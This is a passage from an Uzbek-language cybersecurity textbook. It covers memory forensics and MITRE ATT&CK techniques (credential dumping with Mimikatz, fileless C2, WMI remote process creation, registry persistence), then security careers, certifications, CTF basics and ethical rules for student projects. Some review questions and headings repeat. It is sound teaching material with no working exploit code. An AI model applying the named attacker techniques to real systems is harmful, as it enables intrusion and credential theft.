Ushbu ma’lumotlarning barchasi tizim o‘chirishi bilan yo‘qolib ketgani sababli, xotira tahlili tizimning ayni damda qanday ishlayotganini ko‘rish uchun noyob imkoniyat yaratadi. Bu usul ko‘pincha disk kriminalistikasida topib bo‘lmaydigan dalillarni aniqlaydi, ayniqsa diskka hech qanday fayl yozmaydigan hujumlar bo‘lganda.
Shu bois xotira hodisalarga javob berish jarayonida, ayniqsa jonli tizimlar, zararli dastur tahlili yoki buzilishlardan shubhalanilganda, ustuvor ahamiyatga ega.
Xotira kriminalistikasi odatda tergovning dastlabki bosqichlarida qo‘llaniladi, chunki tizim o‘chirilgach yo‘qolib ketadigan ma’lumotlarni saqlab qolish zarur bo‘ladi. Bu mutaxassislarga faol jarayonlar, tarmoq ulanishlari va boshqa jonli artefaktlarni yo‘qotmasdan yig‘ib olish imkonini beradi.
Xususan, xotirada ishlaydigan tahdidlar, faylsiz zararli dasturlar yoki akkaunt ma’lumotlarini o‘g‘irlash holatlarida juda foydalidir. Xotira tahlili tergov jarayonida yordam beradigan tizim faoliyatining aniq bir lahzasini aks ettirib beradi.
Bo‘shliq xotira (Memory dump)
Xotira dampi (memory dump)- bu tizim RAMining ma’lum bir vaqtdagi “surati”. Unda vaqtincha xotirada saqlanayotgan hamma narsalar, jumladan ishlayotgan jarayonlar, faol sessiyalar, tarmoq faoliyati va hattoki parollar kabi sezgir ma’lumotlar ham aks etadi.
Xotira damplari kriminalistik tahlil, zararli dasturlarni o‘rganish va tahdidlarni aniqlashda keng qo‘llaniladi. Xavfsizlik mutaxassislari ushbu “suratlar”ni tahlil qilib, tizimda nimalar ishlaganini va shubhali yoki ruxsatsiz faoliyatlarni aniqlashadi.
Mimikatz kabi vositalar ko‘pincha red teamlar yoki hujumchilar tomonidan xotiradan parollarni olish uchun ishlatiladi, shu sababli xotira dampi himoya nuqtai nazaridan juda muhimdir.
Xotira dampi qanday yaratiladi?
Xotira dampini yaratish ishlatilayotgan operatsion tizimga bog‘liq. Maqsad - RAM tarkibini imkon qadar o‘zgartirmasdan olishdir.
Windowsda o‘rnatilgan crash dumplar, Sysinternals RAMMap yoki WinPmem va FTK Imager kabi vositalar to‘liq yoki qisman xotira nusxasini olishda qo‘llaniladi. Kernel darajasidagi dumplar odatda %SystemRoot%\MEMORY.DMP ga, gibernatsiya fayllari esa %SystemDrive%\hiberfil.sys ga yoziladi.
Linux va macOSda LiME (Linux Memory Extractor) yoki dd (disk dump) yordamida /dev/mem yoki /proc/kcore dan nusxa olinadi (kernel himoyalariga bog‘liq).
Xotira damplarining turlari
Xotira damplari qamrovi va maqsadiga ko‘ra farqlanadi:
To‘liq xotira dampi (Full memory dump): RAMning to‘liq nusxasi, kernel va foydalanuvchi sohasi bilan birga. Kriminalistika va zararli dastur tahlilida eng foydali tur.
Jarayon dampi (Process Dump): faqat bir ishchi jarayonning xotirasini oladi. Teskari tahlil yoki muayyan ilova ichidagi zararli xatti-harakatni izolyatsiya qilish uchun qo‘l keladi.
Pagefile va Swap tahlili: RAM to‘lganda tizim ma’lumotning bir qismini diskka chiqaradi. Windowsda: pagefile.sys, Linuxda: swap bo‘limi yoki swapfile. Bu fayllar RAMda bo‘lgan ma’lumotlarning fragmentlarini saqlashi mumkin.
Ba’zi hollarda tizimning gibernatsiya fayli, hiberfil.sys ham RAMdagi ma’lumotlarni tiklash uchun tahlil qilinadi.
Analitiklar ko‘pincha standart vositalardan tashqari xotirani “carving” qilish, kernel darajasida tekshirish va o‘zini tutish bo‘yicha tahlil kabi usullardan foydalanishga majbur bo‘ladilar.
Shifrlash va paketlar ichiga joylashtirish usullari xotira mazmunini tushunishni yanada qiyinlashtiradi. Ba’zida zararli yuklamalar yoki siqilgan kod bloklari xotirada shifrlangan holda turadi va faqat ish vaqtida ochiladi va bu tahlilni murakkablashtiradi.
Xotira tahlili, hujum izlarini topish
Xotira tahlili diskda iz qoldirmaydigan tahdidlarni aniqlashda ayniqsa kuchli vositadir. Loglar va fayl tizimlari uzoq muddatli dalillarni bersa, xotira ayni damda sodir bo‘layotgan voqealarni ko‘rsatadi. Shu sababli faol yoki yaqinda ishlagan hujumlarni aniqlashda juda muhimdir.
Analitiklar xotirada eng ko‘p izlaydigan artefaktlar:
	•	diskda mos fayli bo‘lmagan, shubhali yoki zararli jarayonlar;
	•	DLL injection - haqiqiy jarayon xotirasiga zararli kod kiritilishi;
	•	Process hollowing - ishonchli jarayon xotirasi zararli kod bilan almashtirilishi;
	•	API hooking - funksiyalarni ushlab qolish yoki o‘zgartirish orqali faoliyatni yashirish yoki tizimni manipulyatsiya qilish;
	•	Rootkitlar, ayniqsa kernel darajasidagilari, fayllar, jarayonlar va tarmoq ulanishlarini yashirish uchun xotira tuzilmalarini o‘zgartiradi.
Bu texnikalar ko‘pincha xotirada o‘ziga xos izlar qoldiradi (noodatiy xotira bo‘laklari, PE sarlavhalarining mos kelmasligi, yozilishi mumkin bo‘lgan sahifalarda kod bajarilishi va hk). Bularni kriminalistik vositalar yordamida aniqlash mumkin.
Quyida xotira tahlili orqali aniqlash mumkin bo‘lgan eng keng tarqalgan hujumlar keltirilgan.
Qayd yozuvlarini boshqarish (Credential Access (MITRE ATT&CK: T1003))
T1071 - Ilova qatlami protokoli: buyruq va nazorat (Application Layer Protocol: Command and Control)
Zamonaviy zararli dasturlar ko‘pincha diskka hech narsa tushirmasdan tashqi serverlar bilan aloqa qiladi. Bunday faylsiz malware xotirada ishlaydigan yuklamalar orqali buyruqlarni oladi yoki HTTP, HTTPS, DNS kabi protokollar orqali ma’lumotlarni yashirincha uzatadi.
Xotirada shifr ochilgan C2 konfiguratsiyalari, IP manzillar, beacon paketlari (simsiz tarmoqlarda) kabi loglarda uchramaydigan artefaktlarni topish mumkin.
Xotirada skriptni bajarish (In-Memory Script Execution (T1086))
T1086 - PowerShell skriptlarining to‘g‘ridan-to‘g‘ri xotirada bajarilishi ularni kuzatishni qiyinlashtiradi, chunki ular diskka yozilmaydi. Hujumchilar PowerShell, Python, WMI kabi interpretatorlardan foydalanib kodni RAMda ishga tushiradi.
Xotira tahlili PowerShell jarayoni ichida to‘liq skriptlar, kodlangan buyruqlar yoki ish vaqtida paydo bo‘ladigan artefaktlarni ko‘rsatishi mumkin.
Xotiradagi barqarorlik usullari
Jonli xotira tahlili davomida quyidagi barqarorlik (persistence) mexanizmlari aniqlanishi mumkin:
T1053.005 - Rejalashtirilgan vazifa /ish (Scheduled Task/Job)
Vazifalarni rejalashtirgich (Task Scheduler) orqali belgilangan vaqt oralig‘ida ishlaydigan vazifalar yaratiladi. Xotirada schtasks.exe jarayonlari yoki vazifa nomlari, zararli fayl yo‘llari uchrashi mumkin.
T1543.003 - Zararli Windows xizmati (Malicious Windows Service)
Zararli servislar services.exe ostida yashirin ravishda ishlashi mumkin. Xotira tahlilida g‘ayrioddiy servis nomlari yoki konfiguratsiyalari aniqlanadi.
T1547.001 - Registry Run Keys / Startup Folder
Zararli dasturlar ishga tushishda avtomatik faol bo‘lish uchun HKCU\Software\Microsoft\Windows\CurrentVersion\Run bo‘limiga yozuv qo‘shadi. Ushbu qiymatlarni RAMdan tiklash yoki xotirada kechirilgan registr bo‘laklari (hive)laridan topish mumkin.
Xotira artefaktlari orqali yon tomonga hujum (Lateral Movement)
Xotira kriminalistikasi boshqa tizimlarga o‘tishga qaratilgan harakatlarni ham fosh qilishi mumkin. Keng tarqalgan usullar:
T1021.002 - Remote Services: SMB / PsExec
PsExec masofaviy tizimlarda buyruq bajarishga imkon beradi. Xotirada PsExec xizmatlari yoki buyruq satri argumentlari topilishi mumkin.
T1021.006 - WinRM (Windows Remote Management)
WinRM PowerShell orqali masofadan boshqarishni ta’minlaydi. Xotirada wsmprovhost.exe jarayoni va masofaviy sessiya izlari uchrashi mumkin.
T1059.001 - PowerShell Remote Execution
PowerShell masofaviy buyruqlar bajarishda keng qo‘llaniladi. Xotirada PowerShell jarayonida base64 kodlangan, obfuskatsiya qilingan buyruqlarni aniqlash mumkin.
T1047 - WMI (Windows Management Instrumentation)
Masalan, wmic process call create kabi WMI buyruqlari masofaviy jarayon yaratish uchun ishlatiladi. Bu buyruqlarga oid satrlar yoki WMI sinf havolalari xotirada saqlanib qolgan bo‘lishi mumkin.
	Nima uchun RAM o‘zgaruvchan xotira hisoblanadi va u kriminalistika uchun nega juda muhim?
	•	Virtual xotira qanday ishlaydi va OS qachon swap maydonidan foydalanadi?
	•	Kernel va foydalanuvchi sohalari o‘rtasidagi asosiy farqlar nimalardan iborat?
	•	Xotira dampi nima va Windows hamda Linuxda u qanday yaratiladi?
	•	DLL injection, process hollowing va API hooking kabi usullar xotirada qanday iz qoldiradi?
	•	Faylsiz malware qanday qilib diskda iz qoldirmasdan ishlaydi va uni RAMda qanday aniqlash mumkin?
	•	PowerShell yoki boshqa interpretatorlar orqali xotirada bajarilgan skriptlarni qanday artefaktlar orqali topish mumkin?
Nazorat savollari
	•	Nima uchun RAM o‘zgaruvchan xotira hisoblanadi va u kriminalistika uchun nega juda muhim?
	•	Virtual xotira qanday ishlaydi va OS qachon swap maydonidan foydalanadi?
	•	Kernel va foydalanuvchi sohalari o‘rtasidagi asosiy farqlar nimalardan iborat?
	•	Xotira dampi nima va Windows hamda Linuxda u qanday yaratiladi?
	•	DLL injection, process hollowing va API hooking kabi usullar xotirada qanday iz qoldiradi?
	•	Faylsiz malware qanday qilib diskda iz qoldirmasdan ishlaydi va uni RAMda qanday aniqlash mumkin?
	•	PowerShell yoki boshqa interpretatorlar orqali xotirada bajarilgan skriptlarni qanday artefaktlar orqali topish mumkin?
Nazorat savollari

X BOB. INDIVIDUAL VA ETHICAL LOYIHALAR

X BOB. INDIVIDUAL VA ETHICAL LOYIHALAR




Ta’lim maqsadlari:
–	kiberxavfsizlik sohasidagi kasblar va sertifikatlarni (CEH, Security+, va boshqalar) ta’riflaydi hamda ularning kasbiy rivojlanishdagi ahamiyatini tushuntiradi;
–	etik xakerlik va loyiha qoidalarini izohlaydi, huquqiy va axloqiy cheklovlarga rioya qilish zarurligini asoslaydi;
–	kichik xavfsiz tarmoq arxitekturasini loyihalaydi, himoya qatlamlarini amalda qo‘llaydi;
–	oldin o‘rganilgan vositalardan foydalangan holda penetration testing simulyatsiyasini bajaradi va natijalarni hujjatlashtiradi;
–	CTF (Capture The Flag) musobaqalarining qoidalarini tushuntiradi va ularni qonuniy hamda xavfsiz tarzda bajaradi;
–	web, parol va tarmoq CTF vazifalarini tahlil qiladi, zaifliklardan foydalanadi va himoya choralarini taklif etadi;
–	tarmoq mudofasi ssenariysida hujumni aniqlaydi, javob choralarini muvofiqlashtiradi va tizimni himoyalaydi;
–	raqamli kriminalistika CTF orqali yashirilgan dalillarni topadi, tahlil qiladi va xulosa chiqaradi;
–	jamoaviy yakuniy loyiha natijalarini taqdim etadi, o‘rganilgan bilimlar va kelajakdagi kasbiy maqsadlar bo‘yicha javob bera oladi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Kiberxavfsizlik sohasidagi karyeraga kirish (Введение в карьеру в области кибербезопасности) - https://www.coursera.org/learn/introduction-to-cybersecurity-careers
2. Kiberxavfsizlik sohasida ish izlash va suhbatlar: Ishga kirish (Поиск работы в области кибербезопасности и собеседования: Начало работы) - https://www.coursera.org/learn/cybersecurity-jobs 
10-bob haqida umumiy ma’lumot
Mazkur bobda kiberxavfsizlik sohasida oid faoliyat sohalari, bu sohada karyerani amalga oshirish, buning uchun talab etiladigan xalqaro sertifikatlar, bilimlar, soha mutaxassislarini tayyorlashda ishlatiladigan amaliy vositalar, CTF musobaqalari, o‘quvchilar tomonidan loyihalarni bajarishda talab etiladigan etikaga oid bilimlar, tartib va qoidalar haqida ma’lumotlar berilgan.


10.1. Kiberxavfsizlik sohasida karyera va xalqaro sertifikatlar  (Ma’ruza mashg‘uloti)
1. Kiberxavfsizlik sohasida karyerani amalga oshirish. 
2. Xalqaro sertifikatlar: CEH, Security+ va boshqalar.
Reja:
1. Kiberxavfsizlik sohasida karyerani amalga oshirish. 
2. Xalqaro sertifikatlar: CEH, Security+ va boshqalar.
Reja:

Kiberxavfsizlik sohasida karyera, Kiberxavfsizlikka oid xalqaro sertifikatlar, CompTIA Security+, CISSP, CEH, CISA, CISM.
Kalit so‘zlar:
Kiberxavfsizlik sohasida karyera, Kiberxavfsizlikka oid xalqaro sertifikatlar, CompTIA Security+, CISSP, CEH, CISA, CISM.
Kalit so‘zlar:
Kiberxavfsizlik sohasida karyerani amalga oshirish
Ushbu bo‘limda Coursera saytida keltirilgan 4 bosqichli (kirish darajasi / entry-level) va 6 bosqichli (o‘rta & professional) kiberxavfsizlik lavozimlari haqida ma’lumotlar keltirilgan.
4-bosqich (Kirish darajasi) lavozimlari
Axborot xavfsizligi tahlilchisi (Information security analyst)
Vazifalari: tarmoqlar va tizimlardagi xavfsizlik kamchiliklarini nazorat qilish, buzilishlar yuz berganida tergov, xatarlar va zaifliklarni aniqlash, foydalanuvchilarga xavfsizlik bo‘yicha yordam berish, tashkiliy xavfsizlik strategiyalarini ishlab chiqishda ishtirok etish. 
O‘rtacha maosh (AQSh): $99,274 / yil. 
Xavfsizlik bo‘yicha mutaxassis (Information security specialist)
Vazifalari: firewall va antiviruslarni sozlash va tekshirish, xodimlar uchun xavfsizlik bo‘yicha treyninglar o‘tkazish, yangi xatarlarni aniqlash, zaifliklarga qarshi choralar taklif qilish. 
O‘rtacha maosh (AQSh): $124,777 / yil. 
Raqamli tergovchi /kriminalistika mutaxassisi (Digital forensic examiner)
Vazifalari: kompyuterlar yoki boshqa qurilmalardan “raqamli iz”larni yig‘ish, o‘chirilgan yoki shikastlangan ma’lumotlarni tiklash, hujjatlash va sud-ishlarda dalil tayyorlash. 
O‘rtacha maosh: $96,157 / yil. 
IT auditor / ichki audit bo‘yicha mutaxassis (IT auditor)
Vazifalari: tashkilotning IT tizimlarini tekshirish, xavfsizlik, samaradorlik va qonunchilik talablariga mosligini baholash; audit natijalarini hujjatlashtirish; xatar va kamchiliklarni aniqlash va tuzatish rejalarini taklif qilish. 
O‘rtacha maosh: $108,163 / yil. 
Bu darajadagi lavozimlar ko‘pincha IT, tarmoqlar, tizim administratori kabi boshlang‘ich IT tajribaga ega bo‘lgan shaxslarga beriladi.
6-bosqich (O‘rta / Malakali darajadagi) lavozimlari
Xavfsizlik tizimlari administratorlari (Security systems administrator)
Vazifalari: korxonaning kiberxavfsizlik tizimlarini kundalik boshqarish, foydalanuvchi akkauntlarini nazorat qilish, xavfsizlik protseduralarini ishlab chiqish va dokumentlash, hujum holatlariga javob berish, muntazam zaxira nusxalari va tizim tekshiruvlari. 
O‘rtacha maosh: $114,967 / yil. 
 Pen-tester / etik xaker (Penetration tester)
Vazifalari: korxonaning tarmoqlari va tizimlariga “xakerlik testlari” o‘tkazish,  ya’ni, ruxsat bilan tizimdan foydalanish harakatlari orqali zaifliklarni aniqlash; xatoliklar to‘g‘risida hisobot tuzish va xavfsizlik bo‘yicha tavsiyalar berish; testlar avtomatlashtirilgan skriptlarini yaratish va ijtimoiy muhandislik kabi xavfsizlik testlari ham o‘tkazish. 
O‘rtacha maosh: $124,127 / yil. 
Xavfsizlik muhandisi (Security engineer)
Vazifalari: kompaniyaning kompyuter tizimlari, tarmoqlari va ma’lumotlarini himoya qilish uchun himoya uskunalari va protseduralarini loyihalash va amalga oshirish; xavfsizlik siyosatlari ishlab chiqish; yangi xavfsizlik yechimlarini sinash va joriy qilish; xakerlik, buzilish holatlariga tayyorgarlik va ularga javob tadbirlarini boshqarish. 
O‘rtacha maosh: $137,879 / yil. 
Xavfsizlik arxitektori (Security architect)
Vazifalari: tashkilot uchun umumiy xavfsizlik strategiyasini ishlab chiqish va amalga oshirish; tarmoqlar va tizimlardagi zaifliklarni aniqlash; yangi xavfsizlik arxitekturasi yaratish; byudjet loyihalash, xavfsizlik operatsiyalarini IT va muhandislik bo‘limlari bilan muvofiqlashtirish; xavfsizlik xurujlariga tayyorgarlik va himoya mexanizmlarini tashkil etish. 
O‘rtacha maosh: $164,433 / yil. 
Kriptografiya muhandisi (Cryptography engineer)
Vazifalari: ma’lumot almashinuvi va saqlanishi uchun maxfiylik va himoyani ta’minlaydigan shifrlash algoritmlari va protokollarini ishlab chiqish; ma’lumotlarni kodlash/koddan chiqarish, mavjud algoritmlarni zaifliklariga tekshirish; shifrlash yechimlarini joriy qilish va testlash. 
O‘rtacha maosh: $137,802 / yil. 
Kiberxavfsizlik bo‘yicha menejer / rahbar (Cybersecurity manager)
Vazifalari: tashkilotning butun xavfsizlik infratuzilmasini boshqarish; inson va texnologik resurslarni muvofiqlashtirish; ichki va tashqi xavfsizlik siyosatini kuzatish va yangilash; zarur vositalarni tanlash; xatarlarni kamaytirish strategiyalarini rejalashtirish va joriy qilish. 
O‘rtacha maosh: $153,084 / yil. 
Xalqaro sertifikatlar: CEH, Security+ va boshqalar
Quyida eng mashhur kiberxavfsizlik sertifikatlari va ular bilan bog‘liq lavozimlar keltirilgan.
1. CompTIA Security+
Boshlang‘ich darajadagi sertifikat. Xavfsizlik asoslari, bulut va IoT muhiti, xavf va muvofiqlik, insidentlarga javob ko‘nikmalarini tasdiqlaydi.
Mos lavozimlar: tizim administratorlari, help desk rahbarlari, xavfsizlik muhandislari, IT auditorlari.
Talablar: rasmiy talab yo‘q, ammo Network+ va 2 yil IT tajribasi tavsiya etiladi.
Narxi: $425.
2. CISSP (Certified Information Systems Security Professional)
Eng nufuzli sertifikatlardan biri. Xavfsizlik dasturlarini loyihalash, joriy qilish va boshqarish bo‘yicha yetuklikni ko‘rsatadi.
Mos lavozimlar: axborot xavfsizligi direktori, xavfsizlik muhandisi, katta konsultant.
Talablar: 5 yillik tajriba.
Narxi: $749.
3. CEH (Certified Ethical Hacker)
Etik xakerlik, zaifliklarni aniqlash va pentest ko‘nikmalarini tasdiqlaydi.
Mos lavozimlar: pentester, insident tahlilchisi, bulut xavfsizlik arxitektori.
Talablar: 2 yillik tajriba yoki rasmiy EC-Council treyningi.
Narxi: $950–$1199.
4. CISA (Certified Information Systems Auditor)
Axborot tizimlarini audit qilish, zaifliklarni baholash, nazoratlarni tekshirish ko‘nikmalarini tasdiqlaydi.
Mos lavozimlar: IT auditor, audit menejeri, xavfsizlik muhandisi.
Talablar: 5 yillik tajriba (qisman daraja bilan almashtirilishi mumkin).
Narxi: $575–$760.
5. CISM (Certified Information Security Manager)
Xavfsizlik boshqaruvi, insident boshqaruvi, xavf menejmenti bo‘yicha menejerlik malakasini tasdiqlaydi.
Mos lavozimlar: IT menejer, axborot xavfsizligi rahbari, risk bo‘yicha konsultant.
Talablar: 5 yillik boshqaruv tajribasi.
Narxi: $575–$760.
6. GCIH (GIAC Certified Incident Handler)
Hujum texnikalari, insidentlarni aniqlash va ularga javob berish bo‘yicha bilimlarni tasdiqlaydi.
Mos lavozimlar: insidentlarga javob beruvchi mutaxassis, xavfsizlik arxitektori.
Talablar: rasmiy talab yo‘q.
Narxi: $999.

7. SSCP (Systems Security Certified Practitioner)
Xavfsizlik infratuzilmasini loyihalash va boshqarish bo‘yicha o‘rta darajadagi sertifikat.
Mos lavozimlar: tarmoq xavfsizlik muhandisi, tizim administratori, xavfsizlik tahlilchisi.
Talablar: 1 yillik tajriba yoki kiberxavfsizlik bo‘yicha daraja.
Narxi: $249.
8. GSEC (GIAC Security Essentials Certification)
Kiberxavfsizlikka o‘tmoqchi bo‘lgan IT mutaxassislari uchun mos boshlang‘ich sertifikat. Tarmoq, kriptografiya, insidentlarga javob, cloud xavfsizligi asoslarini qamrab oladi.
Mos lavozimlar: IT xavfsizlik menejeri, pentester, IT auditor.
Talablar: rasmiy talab yo‘q.
Narxi: $999.
	Security+ sertifikati qaysi kirish darajasidagi lavozimlar uchun eng ko‘p talab qilinadi?
	•	CISSP sertifikati odatda qaysi yuqori lavozimlarga chiqish uchun zarur bo‘ladi?
	•	 CEH sertifikati bilan qaysi amaliy xavfsizlik lavozimlarida ishlash mumkin?
	•	 CISA sertifikati asosan qaysi audit va nazorat lavozimlari uchun mo‘ljallangan?
	•	 CISM sertifikati qaysi boshqaruv darajasidagi kiberxavfsizlik lavozimlari uchun mos keladi?
	•	 GCIH sertifikati qaysi turdagi insidentlarga javob berish bo‘yicha qo‘llaniladi?
	•	Qaysi sertifikatlar texnik (pentest, tahlil, injiniring) va qaysilari menejerlik (risk, boshqaruv, strategiya) lavozimlariga yo‘naltirilgan?
Nazorat savollari
	•	Security+ sertifikati qaysi kirish darajasidagi lavozimlar uchun eng ko‘p talab qilinadi?
	•	CISSP sertifikati odatda qaysi yuqori lavozimlarga chiqish uchun zarur bo‘ladi?
	•	 CEH sertifikati bilan qaysi amaliy xavfsizlik lavozimlarida ishlash mumkin?
	•	 CISA sertifikati asosan qaysi audit va nazorat lavozimlari uchun mo‘ljallangan?
	•	 CISM sertifikati qaysi boshqaruv darajasidagi kiberxavfsizlik lavozimlari uchun mos keladi?
	•	 GCIH sertifikati qaysi turdagi insidentlarga javob berish bo‘yicha qo‘llaniladi?
	•	Qaysi sertifikatlar texnik (pentest, tahlil, injiniring) va qaysilari menejerlik (risk, boshqaruv, strategiya) lavozimlariga yo‘naltirilgan?
Nazorat savollari

10.2. Loyiha yo‘riqnomasi va axloqiy qoidalar  (Ma’ruza mashg‘uloti)
1. CTF musobaqalari.
2. Yakuniy loyiha uchun axloqiy qoidalarni o‘rnatish.
Reja:
1. CTF musobaqalari.
2. Yakuniy loyiha uchun axloqiy qoidalarni o‘rnatish.
Reja:

CTF (Capture The Flag), Jeopardy-style Challenges, Flag (flag{…}), Ethical Hacking, Avtorizatsiyalangan muhit (Authorized Environment), Zaiflikni ishga tushirish (Vulnerability Exploitation), Pen testlash hisoboti (Penetration Testing Report).
Kalit so‘zlar:
CTF (Capture The Flag), Jeopardy-style Challenges, Flag (flag{…}), Ethical Hacking, Avtorizatsiyalangan muhit (Authorized Environment), Zaiflikni ishga tushirish (Vulnerability Exploitation), Pen testlash hisoboti (Penetration Testing Report).
Kalit so‘zlar:
CTF musobaqalari
CTF (Capture The Flag) nima?
CTF – “Bayroqni topish” degan ma’noni anglatadi, unda o‘yinchilar muammolarni yechish yoki raqib tizimiga kirishga urinib ko‘rish orqali o‘z ko‘nikmalarini amalda sinab ko‘radigan o‘yin. Quyida CTFlarning turli turlari berilgan:
Jeopardy uslubi: Bu variantda o‘yinchilar muayyan masalalarni yechib, g‘alaba qozonish uchun “flag” (matndan iborat maxsus satr) olishadi.
Hujum-himoya (Attack-Defence): Bu turda ikki jamoa yaratiladi: Qizil Jamoa (Red team, tizimga kirishga harakat qiladi) va Ko‘k Jamoa (Blue team, tizimni himoya qiladi).
CTFda nima sodir bo‘ladi?
Ushbu mavzuda boshlovchilar uchun eng qulay bo‘lgani sababli, Jeopardy-uslubidagi CTF haqida to‘xtalib o‘tiladi. CTFda server masalalarni joylashtiradi, ularni yechganda “flag” ochiladi. Flag - bu CTFni yechganingizni ko‘rsatish uchun saytga kiritiladigan matn satri.
CTFda qatnashish uchun nimalar kerak?
Ko‘pchilik CTFlar bepul bo‘lib, ishtirokchidan faqat ro‘yxatdan o‘tish talab qilinadi. Boshlash uchun kerak bo‘ladigan ko‘nikmalar:
	•	fundamental kompyuter bilimlari;
	•	fundamental dasturlash ko‘nikmalari;
	•	fundamental tarmoqlar bo‘yicha bilim;
	•	ijodiy muammo yechish qobiliyati;
	•	qanday izlanish qilishni bilish.
Ko‘p uchraydigan challege turlari:
	•	Cryptography - odatda ma’lumotni shifrlash yoki shifrni ochishni talab qiladi;
	•	Steganography - fayllar yoki rasmlarga yashirilgan ma’lumotni topish;
	•	Binary - binar faylni teskari muhandislik asosidda tahlil qilish yoki ekspluatatsiya qilish;
	•	Web Exploitation - web sahifalarni ekspluatatsiya qilib flag topish;
	•	Pwn - serverni ekspluatatsiya qilib flagni topish.
Nega CTFda qatnashish kerak?
CTFning eng yaxshi tarafi boshlang‘ich bilim bilan ham kirish va asta-sekin ko‘nikmalarni oshirib borish mumkin. Ko‘plab o‘yinchilar internetda muammo ortidagi texnologiyani tushunish yoki muammoni samarali yechish yo‘lini izlab yangi atamalar va texnologiyalarni o‘rganishadi.
Yana bir sabab boshqa odamlar bilan tanishish, ular bilan raqobat qilish yoki hamkorlikda murakkab masalalarni yechish imkoniyati. Bu sizning kommunikatsiya va jamoada ishlash ko‘nikmalaringizni rivojlantiradi (ish beruvchilar izlaydigan juda muhim ko‘nikma).
Eng asosiysi vazifalar qiziqarli: muammoni ijodiy yechish, Internetdan izlab biror kishi o‘xshash masalani yechgan yoki yo‘qligini bilish, bularning barchasi jarayonni yanada zavqli qiladi. Har doim yangi funktsiyalar va muammolar qo‘shilganligi sababli CTF hech qachon zerikarli bo‘lib qolmaydi va ishtirokchini doimo kiberxavfsizlik haqida yangi narsalarni o‘rganishga majbur qiladi.
CTF bilan qanday boshlash kerak
CTFga kirish osonroq ko‘rinadi. Mutaxassis bo‘lish shart emas - faqat qiziqish va o‘rganishga tayyorlik kifoya!
Boshlovchilar uchun platformalar
	•	TryHackMe – to‘liq boshlovchilar uchun juda mos, bosqichma-bosqich laboratoriyalar;
	•	picoCTF – o‘quvchilar va boshlovchilar uchun mo‘ljallangan, qiziqarli vazifalar;
	•	Hack The Box – haqiqiy tizimlarga o‘xshash ssenariylar. “Starting Point” laboratoriyalaridan boshlang.
Kerak bo‘ladigan vositalar:
	•	Burp Suite – web ilovalarni xavfsizlik nuqtai nazaridan test qilish;
	•	Wireshark – tarmoq trafikini tahlil qilish;
	•	Nmap – tarmoqni skanerlash;
	•	Ghidra – binar fayllarni teskari muhandislik yordamida o‘rganish;
	•	CyberChef – brauzerda ishlaydigan kripto/stego masalalarini yechish vositasi;
	•	Linux – ko‘pchilik vositalar oldindan o‘rnatilgan, CTFlar uchun juda qulay.
Quyida CTFlarda ko‘p uchraydigan atamalar lug‘ati:
	•	Flag: yashirilgan matn (masalan, flag{you_found_me}), vazifani yechganingizni isbotlaydi;
	•	Payload: tizimga ma’lum vazifani bajarish uchun yuboriladigan kod - ko‘pincha ekspluatatsiyada ishlatiladi;
	•	Shell: tizimni boshqarish imkonini beruvchi buyruq satri interfeysi;
	•	Reverse Shell: nishon tizimi sizga qayta ulanib, sizga boshqaruv beradi;
	•	Buffer Overflow: dastur xotirasiga ortiqcha ma’lumot yuborilganda yuzaga keladigan xato bo‘lib, tizimni boshqarish imkonini berishi mumkin;
	•	XOR: ma’lumotni yashirish/arashtirishda ishlatiladigan oddiy shifrlash usuli;
	•	Base64: matnni kodlash usuli (xavfsiz emas), ko‘pincha ma’lumotni yashirish yoki formatlash uchun ishlatiladi;
	•	Stego (Steganography): ma’lumotni fayllar (rasm, audio va h.k.) ichiga yashirish;
	•	Brute Force: barcha mumkin bo‘lgan parollar yoki kalitlarni sinab chiqish;
	•	Port Scanning: kompyuterdagi ochiq portlarni tekshirish (masalan, Nmap orqali);
	•	Obfuscation: kod yoki ma’lumotni tushunishni qiyinlashtirish;
	•	Hash: ma’lumotning noyob “barmoq izi”. Ko‘pincha yaxlitlikni tekshirish yoki parollarni saqlashda ishlatiladi
	•	Kodlash (Encoding) va Shifrlash (Encryption):
	•	Encoding = Formatni o‘zgartirish (masalan, Base64), qaytarish oson;
	•	Encryption = Ma’lumotni himoyalash, ochish uchun kalit kerak.
Yakuniy loyiha uchun axloqiy qoidalarni o‘rnatish
Yakuniy xaking loyihasi (penetration testing, CTF, xavfsizlik tahlili, ekspluatatsiya namoyishi yoki zararsiz hujum simulyatsiyasi) talabalarning texnik ko‘nikmalarini amalda tekshiradi. Ammo, bunday loyihalar faqat axloqiy me’yorlar, huquqiy cheklovlar, va mas’uliyatli foydalanish tamoyillari asosida bajarilishi kerak. Ushbu bo‘lim yakuniy loyihaning xavfsiz, qonuniy va professional tarzda bajarilishini ta’minlaydi.
1. Loyiha Maqsadi
Talabalarda amaliy kiberxavfsizlik ko‘nikmalarini shakllantirish;
Real hujum ssenariylarini tushunish, lekin zararsiz simulyatsiya orqali;
Etik xakerlik me’yorlariga amal qilgan holda xavfsizlik zaifliklarini aniqlash;
Tahlil, hisobot tayyorlash, hujum izlarini qayd etish kabi professional ko‘nikmalarni mustahkamlash.
2. Etik Hacking tamoyillari
Loyiha quyidagi asosiy etik qoidalarga tayanadi:
	•	Ruxsat mavjud bo‘lsa – hujum mumkin;
Faqat o‘qituvchi tomonidan berilgan laboratoriya muhiti, test serverlar, simulyatsiya tizimlari yoki o‘yinlash (sandbox) platformalaridan foydalanishga ruxsat bor.
	•	Hech qanday real tizimga hujum qilinmaydi
Talaba quyidagilarga hujum qilishi taqiqlanadi:
	•	internetdagi real saytlar;
	•	universitet yoki tashqi tarmoqlar;
	•	talabalar, o‘qituvchilar shaxsiy qurilmalari;
	•	istalgan ochiq server yoki IP manzillar.
	•	Maxfiylikni hurmat qilish
Shaxsiy ma’lumot, parollar, akkaunt qaydnomalarini yig‘ish, ko‘rish yoki nusxalash qat’iyan man etiladi.
	•	Zarar yetkazmaslik
Hujum faqat o‘qituvchi tomonidan test uchun yaratilgan muhitda bajariladi va tizimlarga zarar yetkazmaydi:
	•	Ma’lumotlar o‘chirilmaydi;
	•	Tarmoq to‘silmaydi;
	•	Qurilma resurslari to‘liq xavfsiz.
	•	Insidentlarni yashirmaslik
Agar talaba tasodifan zarar yetkazsa yoki ruxsatsiz tizimga kirib qolsa, darhol xabar berishi shart.
3. Ruxsat etilgan faoliyatlar
CTF vazifalarini bajarish;
Metasploitable, DVWA, OWASP Juice Shop kabi laboratoriya muhitlarida ekspluatatsiya;
Wireshark, Nmap, Burp Suite kabi vositalardan foydalanish;
